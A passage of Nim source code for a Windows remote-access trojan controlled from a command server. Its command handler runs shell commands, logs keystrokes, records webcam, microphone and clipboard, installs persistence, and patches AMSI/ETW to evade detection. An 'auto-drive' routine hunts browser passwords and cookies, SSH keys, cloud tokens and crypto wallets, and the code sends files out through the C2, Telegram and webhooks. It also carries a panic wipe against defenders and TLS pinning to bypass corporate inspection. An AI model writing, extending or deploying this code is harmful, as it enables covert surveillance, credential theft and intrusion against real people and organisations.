      let actualDibSize = dibSize + extraHdr

      # Stitch a real BMP: 14-byte file header + (DIB including
      # any color masks).
      let fileSize = 14 + actualDibSize
      var bmp = newSeqOfCap[byte](fileSize)
      # "BM"
      bmp.add(0x42); bmp.add(0x4D)
      proc putU32(b: var seq[byte], v: int32) =
        b.add(byte(v and 0xFF))
        b.add(byte((v shr 8) and 0xFF))
        b.add(byte((v shr 16) and 0xFF))
        b.add(byte((v shr 24) and 0xFF))
      proc putU16(b: var seq[byte], v: int16) =
        b.add(byte(v and 0xFF))
        b.add(byte((v shr 8) and 0xFF))
      putU32(bmp, int32(fileSize))
      putU16(bmp, int16(0))                              # reserved
      putU16(bmp, int16(0))                              # reserved
      putU32(bmp, int32(14 + sizeof(BITMAPINFOHEADER) + extraHdr))
      # Copy the DIB (header + masks + pixel data) from clipboard.
      let src = cast[ptr UncheckedArray[byte]](hDib)
      let total = actualDibSize
      var copied = 0
      while copied < total:
        let chunk = min(4096, total - copied)
        for j in 0..<chunk: bmp.add(byte(src[copied + j]))
        inc copied, chunk

      let ts = int(getTime().toUnix * 1000) + rand(1000)
      let filename = "cam_" & $ts & ".bmp"
      let chunkSize = 524288
      let totalChunks = (bmp.len + chunkSize - 1) div chunkSize
      var idx = 0
      var off2 = 0
      while off2 < bmp.len:
        let n = min(chunkSize, bmp.len - off2)
        await sendToC2(%* {
          "type": "file_chunk",
          "filepath": filename,
          "chunk_index": idx,
          "total_chunks": totalChunks,
          "data": base64.encode(bmp[off2 ..< off2 + n]),
          "last_chunk": off2 + n >= bmp.len
        })
        inc idx
        off2 += n

      return %* {"type": "output",
                 "data": "[" & BuildPrefix & "] cam: device=" & $devIdx &
                         " " & $w & "x" & $h & " (" & $bmp.len & " bytes, " &
                         $totalChunks & " chunks) -> downloads/" & filename}
    finally:
      discard got
      CloseClipboard()
  finally:
    if connected:
      discard SendMessageA(hwnd, WM_CAP_DRIVER_DISCONNECT, 0, 0)
    DestroyWindow(hwnd)

proc processList(): JsonNode =
  try:
    var snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == cast[HANDLE](-1):
      return %* {"type": "output", "data": "[!] snapshot failed"}
    var entry: PROCESSENTRY32W
    entry.dwSize = DWORD(sizeof(PROCESSENTRY32W))
    if Process32FirstW(snap, addr entry) == 0:
      discard CloseHandle(snap)
      return %* {"type": "output", "data": "[!] Process32First failed"}
    var rows: seq[JsonNode] = @[]
    while true:
      rows.add(%* {
        "pid": entry.th32ProcessID,
        "ppid": entry.th32ParentProcessID,
        "name": $entry.szExeFile
      })
      if Process32NextW(snap, addr entry) == 0: break
    discard CloseHandle(snap)
    return %* {"type": "ps", "rows": rows}
  except:
    return %* {"type": "output", "data": "[!] ps: " & getCurrentExceptionMsg()}

proc getClipboard(): JsonNode =
  try:
    let res = OpenClipboard(0)
    if res == 0:
      return %* {"type": "output", "data": "[!] OpenClipboard failed"}
    defer: discard CloseClipboard()
    let h = GetClipboardData(CF_UNICODETEXT)
    if h == 0:
      return %* {"type": "output", "data": "[(empty)]"}
    let p = cast[WideCString](GlobalLock(h))
    if p == nil:
      return %* {"type": "output", "data": "[!] GlobalLock failed"}
    let s = $p
    discard GlobalUnlock(h)
    return %* {"type": "output", "data": "[CLIP] " & s}
  except:
    return %* {"type": "output", "data": "[!] clip: " & getCurrentExceptionMsg()}

proc fileSearch(pattern: string): JsonNode =
  try:
    let parts = pattern.split(";", 1)
    let path = if parts.len > 0: parts[0] else: "."
    let mask = if parts.len > 1: parts[1] else: "*"
    var rows: seq[JsonNode] = @[]
    for f in walkFiles(path / mask):
      try:
        rows.add(%* {"path": f, "size": getFileSize(f)})
      except: discard
    return %* {"type": "find", "rows": rows, "count": rows.len}
  except:
    return %* {"type": "output", "data": "[!] find: " & getCurrentExceptionMsg()}

# ------------------------------------------------------------
# COMMAND HANDLER
# ------------------------------------------------------------
proc executeShell(command: string): Future[JsonNode] {.async.} =
  # Run synchronously inside the async proc. This blocks the event
  # loop for the duration of the command; heartbeats will be late but
  # the alternative (spawning a thread that returns a result through
  # a Channel) hits Nim 2.x's `wasMoved` raise-tracking in
  # channels_builtin.nim. For an operator-driven tool most commands
  # return in <1 s; long-running ones will pause the loop.
  try:
    let (outp, code) = execCmdEx(command, options = {poStdErrToStdOut})
    result = %* {"type": "output", "data": outp, "exit_code": code}
  except:
    result = %* {"type": "output", "data": "[!] shell: " & getCurrentExceptionMsg(), "exit_code": -1}

proc downloadFile(filepath: string,
                 sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.}
                ): Future[void] {.async.} =
  const chunkSize = 524288
  if not fileExists(filepath):
    await sendToC2(%* {"type": "output", "data": "[!] Not found: " & filepath})
    return
  let total = (getFileSize(filepath) + chunkSize - 1) div chunkSize
  let f = open(filepath, fmRead)
  defer: f.close()
  var buf = newSeq[byte](chunkSize)
  var idx = 0
  while true:
    let n = f.readBuffer(addr buf[0], chunkSize)
    if n == 0 and idx > 0: break
    await sendToC2(%* {
      "type": "file_chunk", "filepath": filepath, "chunk_index": idx,
      "total_chunks": total,
      "data": base64.encode(buf[0..<n]),
      "last_chunk": idx >= total - 1
    })
    inc idx
    if n < chunkSize: break

proc uploadFile(localPath: string, remotePath: string,
                dataB64: string,
                sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.}
               ): Future[void] {.async.} =
  # Append a single base64 chunk to remotePath. For multi-chunk upload
  # the server tracks part files and stitches on "upload_done".
  try:
    let data = base64.decode(dataB64)
    createDir(remotePath.parentDir)
    let f = open(remotePath, fmAppend)
    defer: f.close()
    discard writeBuffer(f, addr data[0], data.len)
    await sendToC2(%* {"type": "output", "data": "[+] uploaded " & $data.len & " bytes to " & remotePath})
  except:
    await sendToC2(%* {"type": "output", "data": "[!] upload: " & getCurrentExceptionMsg()})

# ------------------------------------------------------------
# AUTO-DRIVE: autonomous loot discovery
# ------------------------------------------------------------
# When the operator enables auto-drive, the agent walks the box
# looking for credential-rich / high-value files WITHOUT exfiltrating
# them. Each finding is streamed back as a JSON "loot" event:
#   {type: "loot", kind: <category>, path: <abs path>, size: N,
#    mtime: <unix>, preview: <short string for text>}
# The dashboard renders a loot panel with one-click "steal" buttons
# that issue a normal `download <id> <path>` command. This gives the
# operator a firehose of "what's here" without blindly shipping
# every byte over the wire.
when defined(windows):
  var autoDriveRunning = false
  # autoDriveSeenFile is read+written from a gcsafe async proc. The
  # string itself is GC-tracked, so we stash it in a `ref` object on
  # the heap and access via a gcsafe raw pointer to the slot.
  var autoDriveSeenSlot: ref string
  new(autoDriveSeenSlot)
  autoDriveSeenSlot[] = ""

  proc getSeenFile(): string {.gcsafe.} =
    {.cast(gcsafe).}:
      result = autoDriveSeenSlot[]

  proc setSeenFile(s: string) {.gcsafe.} =
    {.cast(gcsafe).}:
      autoDriveSeenSlot[] = s

  proc initAutoDrive() {.gcsafe.} =
    setSeenFile(getEnv("TEMP", expandTilde("~")) / ".svc_audit")
    let f = getSeenFile()
    if fileExists(f):
      try: removeFile(f) except: discard
    autoDriveRunning = true

  proc autoDriveSeen(): Table[string, bool] {.gcsafe.} =
    result = initTable[string, bool]()
    let f = getSeenFile()
    if f.len > 0 and fileExists(f):
      try:
        for line in readFile(f).splitLines():
          if line.strip.len > 0: result[line] = true
      except: discard

  proc autoDriveMarkSeen(paths: openArray[string]) {.gcsafe.} =
    let f = getSeenFile()
    if f.len == 0: return
    try:
      let fh = open(f, fmAppend)
      defer: fh.close()
      for p in paths:
        fh.writeLine(p)
    except: discard

  proc safeSplitPath(p: string, maxParts: int = 4): string {.gcsafe.} =
    # For previews of long file paths we keep only the trailing
    # segments so the dashboard can show something meaningful.
    let parts = p.split(DirSep)
    if parts.len <= maxParts: return p
    return "..." / parts[parts.len - maxParts..<parts.len].join($DirSep)

  proc autoDriveDiscover(
      sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.}
  ): Future[void] {.async, gcsafe.} =
    # One full pass through the high-value file discovery. This is an
    # async proc so it can yield between categories and let the
    # command dispatcher breathe; it doesn't await anything except
    # sleepAsync for pacing.
    var seen = autoDriveSeen()
    var newFound: seq[string] = @[]

    # Helper that registers one loot item.
    proc emit(kind, path: string, extra: JsonNode = nil) {.async, gcsafe.} =
      let key = kind & "|" & path
      if seen.getOrDefault(key, false): return
      seen[key] = true
      newFound.add(key)
      var entry = %* {"type": "loot", "kind": kind, "path": path,
                       "short": safeSplitPath(path)}
      if fileExists(path):
        try:
          entry["size"] = %(getFileSize(path).int)
          entry["mtime"] = %(getLastModificationTime(path).toUnix().int)
        except: discard
        # short preview for tiny text files (creds, configs)
        try:
          if entry["size"].getInt() < 2048:
            let ext = path.splitFile.ext.toLowerAscii
            if ext in [".txt", ".conf", ".json", ".xml", ".ini",
                       ".env", ".yml", ".yaml", ".cfg", ".pem", ".key",
                       ".crt", ".cer", ".pfx", ".p12"]:
              entry["preview"] = %readFile(path)
        except: discard
      if extra != nil:
        for k, v in extra.pairs: entry[k] = v
      await sendToC2(entry)
      await sleepAsync(50)  # pace: 20 loots/sec max

    # 1) Browser data: Chrome, Edge, Firefox
    let localApp = getEnv(obfDec(S_LOCALAPPDATA), expandTilde("~"))
    for (sub, brand) in [
      ("Google\\Chrome\\User Data", "chrome"),
      ("Microsoft\\Edge\\User Data", "edge"),
      ("Mozilla\\Firefox\\Profiles", "firefox")]:
      let base = localApp / sub
      if dirExists(base):
        # Chrome/Edge: Default + Profile N
        if brand != "firefox":
          for prof in ["Default", "Profile 1", "Profile 2", "Profile 3"]:
            let pdir = base / prof
            if dirExists(pdir):
              for db in ["Login Data", "Cookies", "Web Data", "History", "Bookmarks"]:
                let f = pdir / db
                if fileExists(f): await emit("browser", f, %* {"browser": brand, "profile": prof, "label": brand & "/" & prof & "/" & db})
              let ls = base / prof / "Local State"
              if fileExists(ls): await emit("browser", ls, %* {"browser": brand, "label": brand & "/" & prof & "/Local State (encrypted key)"})
        else:
          for d in walkDirs(base / "*"):
            if dirExists(d):
              for db in ["logins.json", "cookies.sqlite", "key4.db", "cert9.db", "places.sqlite", "formhistory.sqlite"]:
                let f = d / db
                if fileExists(f): await emit("browser", f, %* {"browser": "firefox", "label": "firefox/" & db})

    # 2) SSH keys
    let sshDir = getEnv(obfDec(S_USERPROFILE), expandTilde("~")) / obfDec(S_SSH_DIR)
    if dirExists(sshDir):
      for f in walkFiles(sshDir / "*"):
        let n = f.extractFilename
        if n.startsWith(obfDec(S_ID_RSA)) or n == obfDec(S_KH) or
           n == "config" or n.endsWith(".pub"):
          await emit("ssh", f, %* {"label": "ssh/" & n})

    # 3) Cloud tokens
    let uprof = getEnv(obfDec(S_USERPROFILE), expandTilde("~"))
    let cloudEntries = [
      (uprof / obfDec(S_AWS) / obfDec(S_AWS_CREDS), "AWS credentials", "cloud"),
      (uprof / obfDec(S_AWS) / "config", "AWS config", "cloud"),
      (uprof / obfDec(S_GCONFIG) / obfDec(S_GCLOUD) / "credentials", "GCP credentials", "cloud"),
      (uprof / obfDec(S_AZ), "Azure CLI token cache", "cloud"),
      (uprof / obfDec(S_GIT), "Git credentials", "cloud"),
      (uprof / obfDec(S_KUBE) / "config", "kubeconfig (cluster creds)", "cloud")
    ]
    for (p, lbl, k) in cloudEntries:
      if fileExists(p): await emit(k, p, %* {"label": lbl})

    # 4) Wallet data
    let eth = getEnv(obfDec(S_USERPROFILE), expandTilde("~")) / obfDec(S_ETHEREUM)
    if dirExists(eth):
      for d in [eth / obfDec(S_ETH_KEYSTORE), eth / "keystore"]:
        if dirExists(d):
          for f in walkFiles(d / "*"):
            await emit("wallet", f, %* {"label": "eth keystore"})
    let btc = getEnv(obfDec(S_USERPROFILE), expandTilde("~")) / obfDec(S_BITCOIN) / "wallet.dat"
    if fileExists(btc): await emit("wallet", btc, %* {"label": "BTC wallet.dat"})

    # 5) Recent files (jump list .lnk — fingerprint of activity)
    let recentDir = getEnv(obfDec(S_APPDATA), expandTilde("~")) /
                    "Microsoft\\Windows\\Recent"
    if dirExists(recentDir):
      for f in walkFiles(recentDir / "*.lnk"):
        let n = f.extractFilename
        await emit("recent", f, %* {"label": "recent: " & n})

    # 6) Documents scan (small enough to exfil plaintext files like
    # *.pdf, *.docx, *.xlsx, *.txt, *.csv under a tight size cap)
    let docsRoot = getEnv(obfDec(S_USERPROFILE), expandTilde("~")) / "Documents"
    if dirExists(docsRoot):
      try:
        for f in walkFiles(docsRoot / "*"):
          let ext = f.splitFile.ext.toLowerAscii
          if ext in [".pdf", ".docx", ".xlsx", ".txt", ".csv",
                     ".pptx", ".odt", ".ods", ".doc", ".xls",
                     ".key", ".pem", ".env", ".yml"]:
            try:
              let sz = getFileSize(f).int
              if sz > 0 and sz < 10 * 1024 * 1024:  # skip > 10 MB
                await emit("doc", f, %* {"label": "doc/" & f.extractFilename})
            except: discard
      except: discard

    # 7) Persist our seen list so the next pass skips these
    if newFound.len > 0:
      autoDriveMarkSeen(newFound)

    await sendToC2(%* {"type": "output",
      "data": "[*] auto-drive scan complete — " & $newFound.len &
              " new finds (pass summary)"})

  proc autoDriveLoop(
      sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.}
  ) {.async, gcsafe.} =
    # Runs repeatedly while autoDriveRunning is true. Each pass
    # scans the high-value paths; new loot events stream out.
    while autoDriveRunning:
      try:
        await autoDriveDiscover(sendToC2)
      except:
        await sendToC2(%* {"type": "output",
          "data": "[!] auto-drive: " & getCurrentExceptionMsg()})
      # Pause between passes. 60s feels alive without thrashing.
      for _ in 0..<600:
        if not autoDriveRunning: return
        await sleepAsync(100)

# Dedup state: sliding window of recently seen command_ids. The old
# single `lastCmdId` only caught an exact repeat of the most recent
# command — a replayed older frame with a different id passed. A
# bounded window (64 ids) closes that hole without unbounded memory.
const CMD_DEDUP_WINDOW = 64
var seenCmdIds: array[CMD_DEDUP_WINDOW, int64]
var seenCmdIdx = 0

# Forward declaration so handleCommand can call panicWipe. The real
# Windows implementation lives in the OPSEC section below; on other
# platforms this is a no-op.
proc panicWipe()

proc handleCommand(sc: SessionCrypto, cmd: JsonNode,
                   sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.},
                   meta: ref MetaData): Future[void] {.async.} =
  # Command dedup (sliding window)
  let cid = (if cmd.hasKey("cid"): cmd["cid"].getInt() else: 0)
  if cid > 0:
    for i in 0..<CMD_DEDUP_WINDOW:
      if seenCmdIds[i] == cid: return
    seenCmdIds[seenCmdIdx] = cid
    seenCmdIdx = (seenCmdIdx + 1) mod CMD_DEDUP_WINDOW

  let cmdName = (if cmd.hasKey("cmd"): cmd["cmd"].getStr() else: "")
  let cmdArgs = (if cmd.hasKey("args"): cmd["args"].getStr() else: "")
  case cmdName
  of "shell":
    when defined(windows):
      # Lazy evasion: only patch AMSI/ETW right before we run a
      # command that would otherwise get logged. Idempotent.
      let evasion = applyEvasionIfNeeded()
      if evasion.len > 0:
        await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & " evasion] " & evasion})
    let outp = await executeShell(if cmdArgs.len > 0: cmdArgs else: "whoami")
    await sendToC2(outp)
  of "download":
    await downloadFile(cmdArgs, sendToC2)
  of "upload":
    # args = "remotePath" ; data carried in separate field
    let remote = (if cmd.hasKey("path"): cmd["path"].getStr() else: cmdArgs)
    let b64 = (if cmd.hasKey("data"): cmd["data"].getStr() else: "")
    await uploadFile("", remote, b64, sendToC2)
  of "screenshot":
    await sendToC2(await takeScreenshot(sendToC2))
  of "cam":
    # args = device index (optional, default 0). The dispatcher's
    # call site passes just the agent id; if the operator typed
    # extra words, treat the first word as a device number.
    var dev = 0
    if cmdArgs.len > 0:
      try:
        dev = parseInt(cmdArgs.split(' ', 1)[0])
      except:
        dev = 0
    await sendToC2(await captureCam(sendToC2, dev))
  of "clipwatch":
    # Continuous clipboard monitor. args = poll interval in seconds
    # (optional, default 1.5s, clamped to 0.5..30s). One file per
    # paste in downloads/<id>/clip_<unix>_<seq>.txt.
    if clipwatchRunning:
      await sendToC2(%* {"type": "output",
                        "data": "[!] already clipwatching (interval=" &
                                $(clipwatchIntervalMs div 1000) & "s)"})
      return
    var intervalSec = CLIPWATCH_DEFAULT_MS div 1000
    if cmdArgs.len > 0:
      try:
        intervalSec = int(parseFloat(cmdArgs.split(' ', 1)[0]))
      except:
        intervalSec = CLIPWATCH_DEFAULT_MS div 1000
    # Convert to ms and clamp.
    var intervalMs = intervalSec * 1000
    if intervalMs < CLIPWATCH_MIN_MS: intervalMs = CLIPWATCH_MIN_MS
    if intervalMs > CLIPWATCH_MAX_MS: intervalMs = CLIPWATCH_MAX_MS
    clipwatchIntervalMs = intervalMs
    # Allocate the ring if not yet.
    if clipwatchRing == nil:
      clipwatchRingCap = CLIPWATCH_RING_CAP
      clipwatchRing = cast[ptr UncheckedArray[byte]](alloc(clipwatchRingCap))
      zeroMem(clipwatchRing, clipwatchRingCap)
    clipwatchRingHead = 0
    clipwatchRingTail = 0
    clipwatchRingCount = 0
    initLock(clipwatchLock)  # idempotent
    clipwatchLastTextLen = 0
    clipwatchLastFormatId = 0
    clipwatchChunkIdx = 0
    clipwatchCaptureCount = 0
    clipwatchSkippedContention = 0
    clipwatchStalled = false
    clipwatchStartedAt = getMonoTime()
    clipwatchRunning = true
    createThread(clipwatchThreadVar, clipwatchCaptureThread)
    asyncCheck clipwatchDrainTask(sendToC2)
    await sendToC2(%* {"type": "output",
                      "data": "[" & BuildPrefix & "] clipwatching @ " &
                              $(intervalMs div 1000) & "." &
                              $((intervalMs mod 1000) div 100) & "s" &
                              " (cap=16KB/paste, dedupe=on)"})
  of "unclipwatch":
    if not clipwatchRunning:
      await sendToC2(%* {"type": "output", "data": "[!] not clipwatching"})
      return
    clipwatchRunning = false
    # Wait for the thread to actually exit (interruptible sleep
    # bounds it to ~50ms after we set the flag).
    joinThread(clipwatchThreadVar)
    # Drain any remaining records from the ring (give the drain
    # task up to 2s to finish).
    var waitedMs = 0
    while clipwatchRingCount > 0 and waitedMs < 2000:
      await sleepAsync(20)
      waitedMs += 20
    let elapsed = (getMonoTime() - clipwatchStartedAt).inMilliseconds div 1000
    let note = if clipwatchStalled: " (drain stalled, some captures may be lost)" else: ""
    await sendToC2(%* {"type": "output",
                      "data": "[" & BuildPrefix & "] clipwatch stopped after " &
                              $elapsed & "s — " & $clipwatchCaptureCount &
                              " captures, " & $clipwatchSkippedContention &
                              " skipped (clipboard busy)" & note})
    if clipwatchRing != nil:
      dealloc(clipwatchRing)
      clipwatchRing = nil
    clipwatchLastTextLen = 0
    clipwatchLastFormatId = 0
  of "mic":
    # args = seconds (optional, default 10, clamped to 1..120)
    var secs = MIC_DEFAULT_SECS
    if cmdArgs.len > 0:
      try:
        secs = parseInt(cmdArgs)
      except:
        secs = MIC_DEFAULT_SECS
    await sendToC2(await captureMic(sendToC2, secs))
  of "listen":
    # Live mic stream — each ~250ms buffer ships out as it fills, so
    # the operator hears the agent's environment in near-realtime
    # (open downloads/<id>/mic_live_<ts>.wav in `ffplay -infbuf -f
    # s16le -ar 16000 -ac 1 ...` or VLC with file-change auto-reload).
    if micListenRunning:
      let curName = getMicListenFilename()
      await sendToC2(%* {"type": "output",
                        "data": "[!] already listening -> " & curName})
      return
    # Pre-fill the WAV format the capture thread will use.
    micListenFormat.wFormatTag       = WAVE_FORMAT_PCM
    micListenFormat.nChannels        = WORD(MIC_CHANNELS)
    micListenFormat.nSamplesPerSec   = DWORD(MIC_SAMPLE_RATE)
    micListenFormat.nAvgBytesPerSec  = DWORD(MIC_SAMPLE_RATE * MIC_CHANNELS * (MIC_BITS div 8))
    micListenFormat.nBlockAlign      = WORD(MIC_CHANNELS * (MIC_BITS div 8))
    micListenFormat.wBitsPerSample   = WORD(MIC_BITS)
    micListenFormat.cbSize           = 0
    micListenFormatKnown = true
    # Allocate per-buffer raw memory (8 KB each, ×4 = 32 KB total)
    # and a 256 KB ring for handoff. All raw — no GC tracking, so
    # the capture thread can read/write them without GC-safety issues.
    let bufBytes = (MIC_SAMPLE_RATE * MIC_BUF_MS div 1000) * (MIC_CHANNELS * MIC_BITS div 8)
    micListenBufsLen = bufBytes
    for i in 0..<MIC_BUF_COUNT:
      if micListenBufs[i] == nil:
        micListenBufs[i] = cast[ptr UncheckedArray[byte]](alloc(bufBytes))
    micListenRingCap = bufBytes * MIC_LISTEN_QUEUE_MAX * 2
    if micListenRing != nil: dealloc(micListenRing)
    micListenRing = cast[ptr UncheckedArray[byte]](alloc(micListenRingCap))
    micListenRingHead = 0
    micListenRingTail = 0
    micListenRingCount = 0
    initLock(micListenLock)  # idempotent
    setMicListenFilename("mic_live_" & $int(getTime().toUnix * 1000) & $rand(1000) & ".wav")
    let fname = getMicListenFilename()
    micListenChunkIdx = 0
    micListenStalled = false
    micListenStartedAt = getMonoTime()
    # Send the 44-byte WAV header as chunk 0 so the server starts
    # writing the file immediately and the operator's player has
    # a valid file from t=0.
    let hdr = buildMicWavHeader(MIC_SAMPLE_RATE, MIC_CHANNELS, MIC_BITS, 0)
    inc micListenChunkIdx
    await sendToC2(%* {
      "type": "file_chunk",
      "filepath": fname,
      "chunk_index": micListenChunkIdx,
      "total_chunks": MIC_LISTEN_TOTAL_SENTINEL,
      "data": base64.encode(hdr),
      "last_chunk": false
    })
    # Spawn the capture thread and the async drain task.
    micListenRunning = true
    createThread(micListenThreadVar, micListenCaptureThread)
    asyncCheck micListenDrainTask(sendToC2)
    await sendToC2(%* {"type": "output",
                      "data": "[" & BuildPrefix & "] listening -> downloads/" &
                              fname & " (open in ffplay/vlc to hear live)"})
  of "unlisten":
    if not micListenRunning:
      await sendToC2(%* {"type": "output", "data": "[!] not listening"})
      return
    micListenRunning = false
    # Capture thread checks the flag and exits its loop; the drain
    # task continues until the ring is empty. Join so we know the
    # thread has finished its teardown (waveInStop/Close).
    joinThread(micListenThreadVar)
    # Give the drain task a moment to finish the last batch
    # (it's `asyncCheck`'d, so we await it implicitly by waiting
    # on the ring count to reach zero, with a short timeout).
    var waitedMs = 0
    while micListenRingCount > 0 and waitedMs < 2000:
      await sleepAsync(20)
      waitedMs += 20
    # Final closing chunk — server flushes and closes the file.
    inc micListenChunkIdx
    let finalFname = getMicListenFilename()
    await sendToC2(%* {
      "type": "file_chunk",
      "filepath": finalFname,
      "chunk_index": micListenChunkIdx,
      "total_chunks": micListenChunkIdx,
      "data": "",
      "last_chunk": true
    })
    let secs = (getMonoTime() - micListenStartedAt).inMilliseconds div 1000
    let stalledNote = if micListenStalled: " (capture stalled)" else: ""
    await sendToC2(%* {"type": "output",
                      "data": "[" & BuildPrefix & "] listen stopped after " &
                              $secs & "s" & stalledNote & " -> downloads/" & finalFname})
    # Free the ring; per-buffer memory stays allocated for next session.
    if micListenRing != nil:
      dealloc(micListenRing)
      micListenRing = nil
    micListenFormatKnown = false
    micListenFilenameLen = 0
  of "ps":
    await sendToC2(processList())
  of "clip":
    await sendToC2(getClipboard())
  of "find":
    await sendToC2(fileSearch(cmdArgs))
  of "keys":
    if cmdArgs == "start":
      startKeylogger()
      await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] keys+"})
    elif cmdArgs == "stop":
      stopKeylogger()
      await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] keys-"})
    else:
      await sendToC2(%* {"type": "output", "data": "[!] keys {start|stop}"})
  of "persist":
    establishPersistence()
    await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] persist ok"})
  of "kill":
    await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] shutting down"})
    selfCleanup()
    quit(0)
  of "panic":
    # Operator-triggered self-destruct. Unlike `kill`, this is for
    # emergency wipe — overwrite meta file with random bytes before
    # deletion, drop staged exfil, exit. Use when the target might
    # be lost to the blue team.
    when defined(windows):
      await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] panic: wiping"})
      panicWipe()
    else:
      await sendToC2(%* {"type": "output", "data": "[!] panic: not supported on this OS"})
      panicWipe()
  of "killdate":
    # args = unix timestamp; 0 = never
    let ts = (if cmdArgs.len > 0: parseInt(cmdArgs) else: 0)
    meta.killDate = ts
    saveMeta(meta[])
    await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] killdate=" & $ts})
  of "sleep":
    let m = (if cmdArgs.len > 0: parseInt(cmdArgs) else: 0)
    meta.sleepMin = m
    saveMeta(meta[])
    await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] sleep=" & $m & "m"})
  of "c2":
    # args = url — replace C2 list (single url). Empty = current.
    if cmdArgs.len > 0:
      await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] c2 reconfigure (next reconnect) " & cmdArgs})
  of "exfil":
    # args = kind — "browser", "wifi", "cloud", "ssh", "media",
    # "wallet", "recent", "wincreds". Each stages files and returns
    # a JSON descriptor; the operator then issues `download` against
    # the staging dir to pull them over.
    when defined(windows):
      let kind = cmdArgs
      let result = case kind
        of "browser":  exfilBrowserData()
        of "wifi":     exfilWifiPasswords()
        of "cloud":    exfilCloudTokens()
        of "ssh":      exfilSshKeys()
        of "media":    exfilMediaFiles()
        of "wallet":   exfilWalletData()
        of "recent":   exfilRecentFiles()
        of "wincreds": exfilWinCreds()
        else: %* {"type": "output", "data": "[!] exfil: unknown kind (browser|wifi|cloud|ssh|media|wallet|recent|wincreds)"}
      await sendToC2(result)
      if telegramEnabled():
        case kind
        of "browser":
          discard telegramSend("[X7K exfil] browser (" & $result["count"] & " files)")
        of "wifi":
          discard telegramSend("[X7K exfil] wifi profiles (" & $result["count"] & ")")
        of "cloud":
          discard telegramSend("[X7K exfil] cloud tokens (" & $result["count"] & ")")
        of "ssh":
          discard telegramSend("[X7K exfil] ssh keys (" & $result["count"] & ")")
        of "media":
          discard telegramSend("[X7K exfil] media (" & $result["count"] & " files, " & $result["bytes"] & " bytes)")
        of "wallet":
          discard telegramSend("[X7K exfil] wallet data (" & $result["count"] & ")")
        of "recent":
          discard telegramSend("[X7K exfil] recent files (" & $result["count"] & ")")
        of "wincreds":
          discard telegramSend("[X7K exfil] wincreds (" & $result["count"] & ")")
        else: discard
    else:
      await sendToC2(%* {"type": "output", "data": "[!] exfil: not supported on this OS"})
  of "recon":
    # args = kind — "edr", "shares", "software", "usb", "tasks"
    when defined(windows):
      let kind = cmdArgs
      let result = case kind
        of "edr":      reconEdrAv()
        of "shares":   reconNetShares()
        of "software": reconSoftware()
        of "usb":      reconUsbHistory()
        of "tasks":    reconScheduledTasks()
        else: %* {"type": "output", "data": "[!] recon: unknown kind (edr|shares|software|usb|tasks)"}
      await sendToC2(result)
    else:
      await sendToC2(%* {"type": "output", "data": "[!] recon: not supported on this OS"})
  of "tg":
    # args = freeform text — push a notification to the operator's
    # Telegram bot. Useful for the agent to phone home when it
    # finds something interesting (e.g. via a custom command).
    if telegramEnabled():
      let ok = telegramSend("[" & BuildPrefix & "] " & cmdArgs)
      await sendToC2(%* {"type": "output",
        "data": "[" & BuildPrefix & "] tg: " & (if ok: "ok" else: "fail")})
    else:
      await sendToC2(%* {"type": "output", "data": "[!] tg: telegram not configured"})
  of "hook":
    # args = freeform text — push a notification to the configured
    # Discord/Slack webhook. Blends with corp HTTPS traffic.
    if webhookEnabled():
      let ok = webhookSend("[" & BuildPrefix & "] " & cmdArgs)
      await sendToC2(%* {"type": "output",
        "data": "[" & BuildPrefix & "] hook: " & (if ok: "ok" else: "fail")})
    else:
      await sendToC2(%* {"type": "output", "data": "[!] hook: webhook not configured"})
  of "autodrive":
    # args = "start" or "stop". When started, the agent scans the
    # host for high-value files (browser creds, SSH keys, cloud
    # tokens, wallet data, recent files, docs) and streams each
    # discovery as a `loot` event. The dashboard renders them in
    # a loot panel with one-click steal buttons. Idle when no
    # new items are found; passes re-run every 60s.
    when defined(windows):
      if cmdArgs == "start":
        if autoDriveRunning:
          await sendToC2(%* {"type": "output", "data": "[!] auto-drive already running"})
          return
        initAutoDrive()
        asyncCheck autoDriveLoop(sendToC2)
        await sendToC2(%* {"type": "output",
          "data": "[" & BuildPrefix & "] auto-drive started — scanning browser/ssh/cloud/wallet/docs/recent"})
      elif cmdArgs == "stop":
        if not autoDriveRunning:
          await sendToC2(%* {"type": "output", "data": "[!] auto-drive not running"})
          return
        autoDriveRunning = false
        await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] auto-drive stopped"})
      else:
        await sendToC2(%* {"type": "output", "data": "[!] usage: autodrive start|stop"})
    else:
      await sendToC2(%* {"type": "output", "data": "[!] autodrive: not supported on this OS"})
  of "ping": discard
  else:
    await sendToC2(%* {"type": "output", "data": "[!] unknown: " & cmdName})

# ------------------------------------------------------------
# MAIN LOOP
# ------------------------------------------------------------
proc computeDelay(attempt: int): float =
  let base = min(RECONNECT_BASE_DELAY * pow(2.0, attempt.float), RECONNECT_MAX_DELAY)
  max(1.0, base + base * RECONNECT_JITTER * (rand(1.0) * 2 - 1))

# ------------------------------------------------------------
# TLS-pinned WebSocket connect
# ------------------------------------------------------------
# When PINNED_CERT_PEM is non-empty at compile time, the agent pins the
# WSS trust anchor to ONLY that PEM certificate. The OS trust store is
# NOT consulted, so a corporate TLS-inspection proxy presenting its own
# cert is rejected at the TLS handshake (the only alternative the proxy
# has is to drop the connection outright, which is fine — agent retries
# failover URLs). Empty PINNED_CERT_PEM = legacy behavior (use
# newWebSocket which delegates to Nim's httpclient + system trust store).
when defined(windows):
  var pinnedCertPath: string = ""

  proc ensurePinnedCertFile(): string =
    # Write the baked-in PEM cert to a temp file so the SSL context can
    # load it via caFile=, return the path. Cached after first call.
    if pinnedCertPath.len > 0:
      # may have been removed by AV or operator cleanup; re-check
      if fileExists(pinnedCertPath): return pinnedCertPath
    if PINNED_CERT_PEM.len == 0: return ""
    let tmpDir = getEnv("TEMP", expandTilde("~"))
